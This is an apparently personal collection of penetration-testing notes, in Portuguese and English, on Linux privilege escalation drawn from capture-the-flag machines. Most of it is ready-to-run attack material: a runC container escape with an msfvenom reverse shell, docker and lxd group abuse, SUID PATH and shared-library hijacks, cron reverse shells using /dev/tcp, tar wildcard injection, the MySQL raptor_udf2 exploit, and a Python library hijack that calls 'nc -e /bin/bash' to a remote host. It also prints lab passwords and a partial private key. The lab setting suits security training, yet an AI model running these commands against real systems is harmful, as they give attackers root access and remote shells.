# Privilege Escalation

[Kernel Exploit](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Kernel%20Exploit%202380bbbe7b364ca5ab2cb407af952ca0.md)

[Enumeration](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Enumeration%20b4fcea5bfb61499a9d1987c8f23e0a36.md)

[Automated Enumeration tools](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Automated%20Enumeration%20tools%20b55cdc40139f48cdaa84c20249e79b19.md)

[SUDO Privileges at initctl| Privileges Escalation Technique | Ishara Abeythissa](https://isharaabeythissa.medium.com/sudo-privileges-at-initctl-privileges-escalation-technique-ishara-abeythissa-c9d44ccadcb9)

# Docker

- Docker
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled.png)
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%201.png)
    
    [https://github.com/twistlock/RunC-CVE-2019-5736](https://github.com/twistlock/RunC-CVE-2019-5736)
    
    Clonar 
    
    `git clone [https://github.com/twistlock/RunC-CVE-2019-5736](https://github.com/twistlock/RunC-CVE-2019-5736)
    cd RunC-CVE-2019-5736`
    
    Criar uma reverse shell
    
    `cd exec_POC/
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=9001 -f elf -o new_runc`
    
    Entrar no Docker
    
    `sudo docker exec -it webapp-dev01 /bin/bash`
    
    Faz o download automático dos ficheiros necessários
    
    `cd /; for f in bash_evil new_runc overwrite_runc [replace.sh](http://replace.sh/); do wget
    [http://10.10.14.2:8000/$f](http://10.10.14.2:8000/$f); done`
    
    Dar as permissões necessarias aos ficheiros, e mover o ficheiro bash
    
    `chmod +x [replace.sh](http://replace.sh/) overwrite_runc bash_evil
    mv /bin/bash /bin/bash_original
    mv /bash_evil /bin/bash`
    
    Executar o scrip 
    
    `/bin/bash_original /replace.sh`
    
    iniciar uma sessão `nc -nlvp -9001`
    
    Iniciar a outra sessão e mante la aberta até ser necessária 
    
    `ssh -i id_rsa [noah@10.10.10.230](mailto:noah@10.10.10.230)`
    
    `sudo docker exec -it webapp-dev01 /bin/bash_original`
    
- Docker Container
    
    A enumeração do diretório /opt revela o diretório /opt/backup.
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%202.png)
    
    O backup do arquivo gitlab.rb é encontrado para conter credenciais. Este arquivo é usado pelo Gitlab e contém configurações, portanto, usuários de baixo privilégio não devem ter acesso de leitura a este arquivo.
    
    `cat /opt/backup/gitlab.rb | grep password`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%203.png)
    
    Vamos verificar se a senha wW59U!ZKMbG9+*#h é reutilizável para o usuário root.
    
    `su root`
    
    Executando o seguinte comando, é possível verificar se estamos dentro de um contêiner docker ou não. Se estivermos, alguns dos grupos de controle pertencerão ao docker.
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%204.png)
    
    Além disso, ao revisar o arquivo /opt/backup/docker-compose.yml, podemos observar que o container está sendo executado com a flag privileged: true.
    
    cat /opt/backup/docker-compose.yml
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%205.png)
    
    Quando um contêiner docker está sendo executado no modo privilegiado e o acesso root é adquirido, então é possível escapar do contêiner. Tentamos montar o diretório / do host dentro do contêiner docker. Mas primeiro, precisamos executar o seguinte comando para obter o nome da partição que vamos montar.
    
    `lsblk`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%206.png)
    
    `mount /dev/sda2 /mnt -o loop6`
    `ls -l /mnt`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%207.png)
    
    O diretório / é montado com sucesso. Vamos criar chaves SSH para o usuário root do host.
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%208.png)
    
    Nós armazenamos a chave em um arquivo localmente e nomeamo-lo de id_rsa e damos as permissões apropriadas.
    
    `chmod 600 id_rsa`
    
    Por fim, executamos o seguinte comando para conectar.
    
    `ssh -i id_rsa root@10.10.10.22`
    
- Docker Group
    
    `id`
    
    `uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)`
    
    `docker images`
    
    ```c
    
    REPOSITORY   TAG       IMAGE ID       CREATED         SIZE
    alpine       latest    d7d3d98c851f   16 months ago   5.53MB
    ```
    
    `docker run --rm -it -v /:/mnt alpine /bin/sh`
    
    `chroot .`
    
- Docker Escape
    
    ```bash
    Script /dev/null bash
    # As augustus on host machine
    cp /bin/bash .
    exit
    # As root in the docker container
    chown root:root bash
    chmod 4755 bash
    ```
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%209.png)
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2010.png)
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2011.png)
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2012.png)
    
- MemCache
    
    A enumeração da rede interna revela um serviço em execução na porta 11211. Pesquisando online, parece que o Memcached é comumente associado a essa porta.
    
    O Memcached é um sistema de cache em memória usado para acelerar aplicativos web dinâmicos, e ele usa pares de chave-valor para armazenar pequenos dados arbitrários (strings, objetos). Como ele está armazenando em cache dados, pode conter informações sensíveis. Podemos executar comandos contra o serviço Memcached usando o Netcat. Os comandos para o Memcached podem ser encontrados aqui. O comando "stats items" exibe o número que identifica um item específico.
    
    `nc 127.0.0.1 11211
    stats items`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2013.png)
    
    Neste caso, temos apenas um item com o número 1. Para despejar chaves que estão em cache, podemos usar o comando "cachedump", com a seguinte estrutura: "stats cachedump <classe de slab> <número de itens para despejar>". O seguinte comando lista os itens juntamente com suas estatísticas.
    
    `stats cachedump 1 0`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2014.png)
    
    Podemos usar a instrução "get" para extrair o valor de um item. Vamos fazer isso para o item "passwd".
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2015.png)
    
    Vamos tentar esta senha "0n3_p1ec3" com a conta "luffy" que identificamos anteriormente. Digite "quit" duas vezes para sair do Memcached.
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2016.png)
    
    Isso é bem-sucedido. A enumeração do usuário luffy revela que ele é um membro do grupo docker.
    
    `groups`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2017.png)
    
    Quando um usuário é membro do grupo docker, é possível executar comandos como usuário root sem saber a senha do root, pois o docker é executado com o bit SUID. Para explorar isso, uma imagem docker deve existir. Emita o seguinte comando para listar as imagens docker disponíveis no sistema.
    
    `docker images`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2018.png)
    
    A imagem do docker Ubuntu está disponível. Vamos criar um novo contêiner a partir desta imagem e montar o diretório raiz do host dentro do contêiner docker.
    
    `docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2019.png)
    
    Usamos o chroot no diretório /mnt, o que nos permite executar comandos no host. Vamos mudar a senha do usuário root.
    
    `passwd`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2020.png)
    
    `su root`
    

# SUID

- Backup SUID
    
    Ao entrar na maquina deparamos nos com um executável 
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2021.png)
    
    Ao correr o executável, vemos que ele nos dá o ficheiro shadow
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2022.png)
    
    Para obter mos este resultado, o executavel faz um `cat /etcshadow`
    
    Ao correr gdb `./backup` , e fizermos dois comandos `si` (step into)
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2023.png)
    
    As suspeitas confirmaram se, ele utiliza o cat para obter o ficheiro `shadow`
    
    Este ataque consiste em utilizar um ficheiro cat, que vamos criar, para ser executado em vez do `/bin/cat` 
    
    ```
    #!/bin/sh
    
    /bin/sh
    ```
    
    Ao fazer isto, ele vai abrir uma shell /bin/sh com privilégios root.
    
    Damos permiessões de execução e acrescentamos a presente diretoria, para que ele assuma esta diretoria primeiro ao correr o executavel.
    
    `export PATH=/home/mitsos:$PATH` 
    
    Verificamos se o PATH foi alterado com sucesso.
    
    `/home/mitsos:pwd:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games`
    
    Agora é so correr o executável
    
    ```
    mitsos@LazyClown:~$ ./backup 
    # whoami
    root
    
    ```
    
- SUID (execute_query)
    
    ```
    www-data@clicker:/$ find / -perm -u=s -type f 2>/dev/null
    /usr/bin/sudo
    /usr/bin/chsh
    /usr/bin/gpasswd
    /usr/bin/fusermount3
    /usr/bin/su
    <SNIP>
    /usr/sbin/mount.nfs
    /opt/manage/execute_query
    ```
    
    O binário /opt/manage/execute_query se destaca por ser um binário SUID não padrão.
    Ao navegar para o diretório /opt/manage, podemos ver que há também um arquivo README.txt com o seguinte conteúdo:
    
    ```
    Web application Management
    Use the binary to execute the following task:
    - 1: Creates the database structure and adds user admin
    - 2: Creates fake players (better not tell anyone)
    - 3: Resets the admin password
    - 4: Deletes all users except the admin
    ```
    
    `strings execute_query` 
    
    ```
    /home/jaH
    ck/queriH
    /usr/binH
    /mysql -H
    u clickeH
    r_db_useH
    r --passH
    word='clH
    icker_dbH
    _passworH
    d' clickH
    er -v < H
    ```
    
    Parece que o executável está a ler as queries que executa a partir da pasta pessoal do utilizador jack. Além disso, existem algumas mensagens de erro relacionadas com a falta de parâmetros ou ficheiros em falta. Vamos fazer fuzzing no executável e tentar chegar a essas mensagens de erro. Se usarmos o strace, obteremos o erro sobre o ficheiro em falta.
    
    `/opt/manage/$ strace ./execute_query 4`
    
    ```
    execve("./execute_query", ["./execute_query", "4"], 0x7fff59545428 /* 15 vars */)
    = 0
    <SNIP>
    setreuid(1000, 1000) = -1 EPERM (Operation not permitted)
    access("/home/jack/queries/clean.sql", R_OK) = -1 EACCES (Permission denied)
    newfstatat(1, "", {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0), ...},
    AT_EMPTY_PATH) = 0
    write(1, "File not readable or not found\n", 31File not readable or not found) =
    31
    exit_group(0) = ?
    +++ exited with 0 +++
    ```
    
    Isto acontece porque o binário não conseguiu definir o ID de Utilizador no contexto do strace. Além disso, podemos ver que as nossas suposições estavam corretas; o binário está de facto a ler as queries a partir de ficheiros dentro do diretório /home/jack. 
    
    Vamos tentar realizar um ataque de travessia de caminho. Para o fazer, vamos especificar uma ação que não existe e, em seguida, fornecer um segundo argumento para o ficheiro a partir do qual ler a query.
    
    `/opt/manage/execute_query 6 ../.ssh/id_rsa`
    
    ```
    -----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
    NhAAAAAwEAAQAAAYEAs4eQaWHe45iGSieDHbraAYgQdMwlMGPt50KmMUAvWgAV2zlP8/1Y
    J/tSzgoR9Fko8I1UpLnHCLz2Ezsb/MrLCe8nG5TlbJrrQ4HcqnS4TKN7DZ7XW0bup3ayy1
    kAAZ9Uot6ep/ekM8E+7/39VZ5fe1FwZj4iRKI+g/BVQFclsgK02B594GkOz33P/Zzte2jV
    Tgmy3+htPE5My31i2lXh6XWfepiBOjG+mQDg2OySAphbO1SbMisowP1aSexKMh7Ir6IlPu
    <...SNIP...>
    F0YCoftLetCA/kiVtqlT0trgO8Yh+78QAAAMEAwYV0GjQs3AYNLMGccWlVFoLLPKGItynr
    Xxa/j3qOBZ+HiMsXtZdpdrV26N43CmiHRue4SWG1m/Vh3zezxNymsQrp6sv96vsFjM7gAI
    JJK+Ds3zu2NNNmQ82gPwc/wNM3TatS/Oe4loqHg3nDn5CEbPtgc8wkxheKARAz0SbztcJC
    LsOxRu230Ti7tRBOtV153KHlE4Bu7G/d028dbQhtfMXJLu96W1l3Fr98pDxDSFnig2HMIi
    lL4gSjpD/FjWk9AAAADGphY2tAY2xpY2tlcgECAwQFBg==
    -----END OPENSSH PRIVATE KEY----
    ```
    
- SUID
    
    `find / -type f -perm -u=s -ls 2>/dev/null`
    
    `getcap -r /`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2024.png)
    
    [GTFOBins](https://gtfobins.github.io/)
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2025.png)
    
    `strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2026.png)
    
    `strings /usr/local/bin/suid-so`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2027.png)
    
    The first step in this process involves checking whether the l`ibcalc.so` file exists.
    This can be done by listing the contents of the user account's home directory:
    `ls -al /home/user/`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2028.png)
    
    `mkdir /home/user/.config`
    
    `touch /home/user/.config/libcalc.c`
    
    ```c
    #include <stdio.h>
    #include <stdlib.h>
    static void inject() __attribute__((constructor));
    void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /
    tmp/bash -p");
    }
    ```
    
    `gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2029.png)
    
    `suid-so`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2030.png)
    
- jjs SUID
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2031.png)
    
    De acordo com o GTFOBins, o comando `run-mailcap` e a utilidade `jjs` podem ser usados para executar comandos como root. Vamos criar uma shell usando a função `Runtime.Exec()` do Java. O comando acima irá copiar `/bin/sh` para `/tmp` e torná-lo SUID.
    
    [https://gtfobins.github.io/gtfobins/jjs/](https://gtfobins.github.io/gtfobins/jjs/)
    
    Primeiro, geramos uma chave ssh com `ssh-keygen`
    
    ```
    echo 'var FileWriter = Java.type("java.io.FileWriter");
    var fw=new FileWriter("/root/.ssh/authorized_keys");
    fw.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3dMzxacP+3hwsrtUGsJ74Cq7ksyDZlgBMo+SrA6Z50/kHDf0rYjUwFndaa61NxhoWz5E3igGlnu1XoQC7MWhBKsgRUwe18vbQZgWQUsteLkOZnQwpRtV2waOBP4yVTzpGbJ+4je3nyzM+/pbIjAZJdidp3pnYNc9yZuNAnFRUN/dWM/FOWfc5p2KmPiXKx0LNGFllJtZBzpIgYqIYPlw3ZjG7lyVKvWfF8qokHhhTrHJlr1/La++21w7u6O52jPS72Cn7es21Jf+fjL70a6jParrGQh/lhg4XW/EwJHzNeZ1AIDXDnKTSJn1YFOkmumUTAS3Vp4Xjpj8l64Ouuw1YRD3nqUwqCu2mbHkATnAn8+Ipbya+0pjW3bY3rAH8YYMG0lVoHKKgiM7rSJE8vnncKINTRmUZbHR74Wp6TC2cjLtr1c2PklyQHaO9szBoSKvZP2Kfk3ZsaiKm4CBv4/7dxXZtmaT4MzsWCaVhwvwMGrKufRBYm12mVIlMbT2rd/E= paulinho13@htb-mlsfenvxz4");
    fw.close();' | jjs
    ```
    
    Depois, é só iniciar `ssh -i mango root@mango.htb`
    
- Path SUID
    
    If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file).
    
    Typically the PATH will look like this:
    
    ![https://i.imgur.com/ch2Z4zp.png](https://i.imgur.com/ch2Z4zp.png)
    
    If we type “thm” to the command line, these are the locations Linux will look in for an executable called thm. The scenario below will give you a better idea of how this can be leveraged to increase our privilege level. As you will see, this depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.
    
    1. What folders are located under $PATH
    2. Does your current user have write privileges for any of these folders?
    3. Can you modify $PATH?
    4. Is there a script/application you can start that will be affected by this vulnerability?
    
    For demo purposes, we will use the script below:
    
    ![https://i.imgur.com/qX7m2Jq.png](https://i.imgur.com/qX7m2Jq.png)
    
    This script tries to launch a system binary called “thm” but the example can easily be replicated with any binary.
    
    We compile this into an executable and set the SUID bit.
    
    ![https://i.imgur.com/A6QQ65I.png](https://i.imgur.com/A6QQ65I.png)
    
    Our user now has access to the “path” script with SUID bit set.
    
    ![https://i.imgur.com/Af1RpuY.png](https://i.imgur.com/Af1RpuY.png)
    
    Once executed “path” will look for an executable named “thm” inside folders listed under PATH.
    
    If any writable folder is listed under PATH we could create a binary named thm under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege
    
    A simple search for writable folders can done using the “`find / -writable 2>/dev/null`” command. The output of this command can be cleaned using a simple cut and sort sequence.
    
    ![https://i.imgur.com/7UekB3t.png](https://i.imgur.com/7UekB3t.png)
    
    Some CTF scenarios can present different folders but a regular system would output something like we see above.
    
    Comparing this with PATH will help us find folders we could use.
    
    ![https://i.imgur.com/67mdmmG.png](https://i.imgur.com/67mdmmG.png)
    
    We see a number of folders under /usr, thus it could be easier to run our writable folder search once more to cover subfolders.
    
    ![https://i.imgur.com/Y3pDsrL.png](https://i.imgur.com/Y3pDsrL.png)
    
    An alternative could be the command below.
    
    `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`
    
    We have added “grep -v proc” to get rid of the many results related to running processes.
    
    Unfortunately, subfolders under /usr are not writable
    
    The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the “`export PATH=/tmp:$PATH`” command accomplishes this.
    
    ![https://i.imgur.com/u1PM8ZD.png](https://i.imgur.com/u1PM8ZD.png)
    
    At this point the path script will also look under the /tmp folder for an executable named “thm”.
    
    Creating this command is fairly easy by copying /bin/bash as “thm” under the /tmp folder.
    
    ![https://i.imgur.com/7UdrEnd.png](https://i.imgur.com/7UdrEnd.png)
    
    We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges.
    
    ![https://i.imgur.com/MlBJ8kb.png](https://i.imgur.com/MlBJ8kb.png)
    
- Capabilities
    
    Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
    
    The capabilities man page provides detailed information on its usage and options.
    
    We can use the `getcap` tool to list enabled capabilities.
    
    ![https://i.imgur.com/Q6XYr0p.png](https://i.imgur.com/Q6XYr0p.png)
    
    When run as an unprivileged user, `getcap -r /` will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.
    
    Please note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.
    
    ![https://i.imgur.com/6csoabB.png](https://i.imgur.com/6csoabB.png)
    
    GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.
    
    We notice that vim can be used with the following command and payload:
    
    ![https://i.imgur.com/nlpCMWj.png](https://i.imgur.com/nlpCMWj.png)
    
    This will launch a root shell as seen below;
    
    ![https://i.imgur.com/jCjvgo3.png](https://i.imgur.com/jCjvgo3.png)
    

# Cron

- Cron Jobs
    
    `crontab`
    
    `cat /etc/crontab`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2032.png)
    
    ![https://i.imgur.com/fwqPuHN.png](https://i.imgur.com/fwqPuHN.png)
    
- Cron Path
    
    `crontab -l
    ls -alh /var/spool/cron;
    ls -al /etc/ | grep cron
    ls -al /etc/cron*
    cat /etc/cron*
    cat /etc/at.allow
    cat /etc/at.deny
    cat /etc/cron.allow
    cat /etc/cron.deny*`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2033.png)
    
    The $PATH variable is used to set the default path that the cron jobs will run
    from, unless specified otherwise.
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2034.png)
    
    `ls -al /home/user/`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2035.png)
    
    `echo "bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1" > overwrite.sh`
    
    `nc -nvlp <PORT>`
    
- Cron Wildcards
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2036.png)
    
    `cat /usr/local/bin/compress.sh`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2037.png)
    
    `echo 'bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1' > shell.sh`
    
    `nc -nvlp <PORT>`
    
    `touch /home/user/--checkpoint=1`
    
    `touch /home/user/--checkpoint-action=exec=sh\ shell.sh`
    
- Cron File Overwrites
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2038.png)
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2039.png)
    
    `ls -al /usr/local/bin | grep overwrite.sh`
    
    `locate overwrite.sh`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2040.png)
    
    `ls -al /usr/local/bin | grep overwrite.sh`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2041.png)
    
    `echo "bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1" >> /usr/local/bin/overwrite.sh`
    
    `nc -nvlp <PORT>`
    

# Insecure Services/Application

- Root mysql
    
    `ps aux | grep mysqld`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2042.png)
    
    Ao fazer uma pesquisa no Google com as palavras-chave "Privilege escalation using mysqld", encontramos este artigo que explora como podemos aumentar nossos privilégios explorando as funções definidas pelo usuário do MySQL, se ele estiver sendo executado como usuário root.
    Seguindo os passos fornecidos no artigo, vamos primeiro baixar o arquivo raptor_udf2.c.
    
    [MySQL User Defined Functions - RedTeam Nation](https://redteamnation.com/mysql-user-defined-functions/)
    
    `wget http://0xdeadbeef.info/exploits/raptor_udf2.c`
    
    Compilamos com o gcc
    
    `gcc -g -c raptor_udf2.c`
    `gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`
    
    `mysql -u root -p mysql`
    
    `create table foo(line blob);`
    
    `insert into foo values(load_file('/tmp/raptor_udf2.so'));`
    
    Agora, vamos encontrar o diretório onde os plugins do MySQL são armazenados.
    
    `show variables like '%plugin%';`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2043.png)
    
    A diretoria onde os plugins do MySQL estão armazenados é /usr/lib/x86_64-linux-gnu/mariadb19/plugin/. Agora vamos exportar a tabela foo que criámos para um ficheiro neste diretório.
    
    `select * from foo into dumpfile "/usr/lib/x86_64-linuxgnu/mariadb19/plugin/raptor_udf2.so";`
    
    Vamos criar uma função que irá usar o arquivo binário raptor_udf2.so que acabamos de exportar.
    
    `create function do_system returns integer soname 'raptor_udf2.so';`
    
    Criamos a nossa reverse shell, mas primeiro criar o listener
    
    `select do_system("bash -c 'bash -i >& /dev/tcp/10.10.14.190/4321 0>&1'");`
    
- lxd group
    
    localmachine
    
    `git clone https://github.com/saghul/lxd-alpine-builder`
    
    `sudo ./build-alpine`
    
    Attacked machine
    
    `wget http://10.10.14.83:8000/alpine-v3.19-x86_64-20231214_1810.tar.gz`
    
    `lxc image import ./alpine-v3.19-x86_64-20231214_1810.tar.gz --alias privesc`
    
    `lxd init`
    
    `lxc image import ./alpine-v3.19-x86_64-20231214_1810.tar.gz --alias privesc`
    
    `lx image list`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2044.png)
    
    `lxc init privesc privesc-container -c security.privileged=true`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2045.png)
    
    `lxc config device add privesc-container mydevice disk source=/ path=/mnt/root recursive=true`
    
    `lxc start privesc-container`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2046.png)
    
    `lxc exec privesc-container /bin/sh`
    
    `cd /mnt/root`
    
    `cat root/root.txt`
    
- shutil
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2047.png)
    
    ```
    import os
    def make_archive(h, t, b):
     os.system('nc 10.10.14.3 8000 -e "/bin/bash"')
    ```
    
    `sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh 6`
    
    `nc -nlvp 1234`
    
- InfluxDB Vulnerability
    
    Na pasta pessoal do usuário Patrick não há um arquivo user.txt, o que significa que provavelmente precisamos mudar para outro usuário. Listando o conteúdo de /home, encontramos o usuário Catherine.
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2048.png)
    
    Para avançar na máquina, precisamos retomar nossos passos de enumeração e lembrar do aplicativo de chat. Podemos fazer login no aplicativo de chat usando "patrick" como nosso nome de usuário.
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2049.png)
    
    Somos apresentados com o histórico de conversas entre Patrick e Admin. Admin informa Patrick que o InfluxDB está instalado no sistema. Pesquisando online, encontramos o projeto InfluxDB. Na documentação, é mencionado que o InfluxDB escuta por padrão na porta 8086. Portanto, podemos tentar verificar a versão do InfluxDB instalada no sistema.
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2050.png)
    
    Usando Curl, vemos que a versão instalada do InfluxDB é 1.7.5. Pesquisando online por possíveis vulnerabilidades para esta versão, encontramos que é vulnerável a Autenticação Bypass. Mais especificamente, um token JWT com segredo vazio é válido e permite autenticação.
    A documentação do InfluxDB é útil, pois indica a estrutura de um payload válido para o token JWT:
    
    [Authentication Bypass in github.com/influxdata/influxdb/services/httpd | CVE-2019-20933 | Snyk](https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMINFLUXDATAINFLUXDBSERVICESHTTPD-1041719)
    
    [Authentication and authorization in InfluxDB | InfluxDB OSS v1 Documentation](https://docs.influxdata.com/influxdb/v1/administration/authentication_and_authorization/)
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2051.png)
    
    Podemos usar o [jwt.io](http://jwt.io/), como mencionado na documentação oficial, para criar um token JWT malicioso. Para a data de expiração, vamos usar o tempo atual em época mais um ano para garantir que o token não expire. Para o campo de nome de usuário, o valor "admin" parece o mais razoável, já que Patrick foi informado pelo admin que o InfluxDB foi instalado no sistema. Com esses valores, podemos criar um token JWT.
    
    [Epoch Converter - Unix Timestamp Converter](https://www.epochconverter.com/)
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2052.png)
    
    Com o token JWT, podemos consultar o banco de dados usando Curl, como mencionado na documentação.
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2053.png)
    
    Há um banco de dados chamado "devzat". Vamos verificar quais tabelas estão disponíveis.
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2054.png)
    
    Temos uma tabela chamada "user". Podemos extrair todos os dados da tabela de usuários usando o seguinte comando:
    
    `curl -G $url --data-urlencode "db=devzat" --data-urlencode "q=SELECT * FROM \"user\"" -
    H "Authorization: Bearer $token"`
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2055.png)
    
    Temos três conjuntos de credenciais. Mais importante ainda, temos a senha para `Catherine`: "`woBeeYareedahc7Oogeephies7Aiseci`". Podemos verificar se a senha é reutilizada no sistema remoto para o usuário Catherine.
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2056.png)
    
    Desta vez, somos apresentados ao histórico de conversas entre Catherine e Patrick. Patrick informa Catherine que uma instância de desenvolvimento de uma aplicação está ouvindo em localhost na porta 8443 e que o código-fonte desta aplicação está disponível nos backups de Catherine. Primeiramente, verificamos se há um serviço em execução na porta 8443, como Patrick nos informou.
    
    De fato, há um serviço em execução na máquina remota que está ouvindo apenas em localhost na porta 8443. Agora, temos que localizar o código-fonte da aplicação para revisá-lo. Patrick mencionou que o código-fonte está nos backups de Catherine. Portanto, o diretório /var/backups parece um lugar razoável para procurá-lo.
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2057.png)
    
    Fazer o download dos ficheiros
    
    Então, executamos o comando "diff" para destacar todas as diferenças entre as duas pastas.
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2058.png)
    
    ![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2059.png)
    
